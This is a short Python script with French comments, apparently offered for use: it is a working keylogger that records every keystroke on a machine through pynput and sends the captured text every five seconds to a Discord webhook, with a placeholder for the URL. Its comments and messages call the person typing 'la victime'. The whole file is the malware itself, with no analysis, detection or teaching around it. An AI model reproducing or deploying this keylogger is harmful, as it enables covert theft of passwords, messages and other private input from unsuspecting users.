import time
import threading
from pynput.keyboard import Listener
import requests

# Variable pour stocker les frappes de touches
key_log = ""

# Fonction appelée à chaque pression de touche
def on_press(key):
    global key_log
    try:
        # Ajouter la touche pressée dans la variable key_log
        key_log += key.char
    except AttributeError:
        # Gérer les touches spéciales comme Espace, Entrée, etc.
        if key == key.space:
            key_log += " "
        elif key == key.enter:
            key_log += "\n"
        else:
            key_log += f"[{key}]"

# Fonction qui imprime les frappes au bout de 5 secondes et les renvoie
def print_log():
    global key_log
    time.sleep(5)
    log_to_send = key_log
    key_log = ""  # Réinitialiser key_log pour le prochain cycle
    if not log_to_send:
        log_to_send = "La victime n'a rien tapé."
    print("Frappes enregistrées :")
    print(log_to_send)
    return log_to_send

# Fonction qui envoie le message au webhook Discord
def send_discord_message(webhook_url, message):
    data = {
        "content": message,
        "username": "Python Bot"
    }

    try:
        response = requests.post(webhook_url, json=data)
        if response.status_code == 204:
            print("Message envoyé avec succès sur Discord.")
        else:
            print(f"Échec de l'envoi, statut : {response.status_code}")
            print(f"Réponse du serveur : {response.text}")
    except requests.RequestException as e:
        print(f"Erreur lors de l'envoi du message Discord : {e}")

# Fonction pour capturer les frappes et envoyer le message en boucle infinie
def capture_and_send():
    webhook_url = 'DISCORD_WEBHOOK'
    while True:
        message = print_log()
        if webhook_url:
            send_discord_message(webhook_url, message)
        else:
            print("L'URL du webhook Discord n'est pas définie.")

# Démarrer le thread pour capturer les frappes et envoyer les messages en boucle
listener_thread = threading.Thread(target=capture_and_send)
listener_thread.start()

# Démarrer l'écoute du clavier
with Listener(on_press=on_press) as listener:
    listener.join()
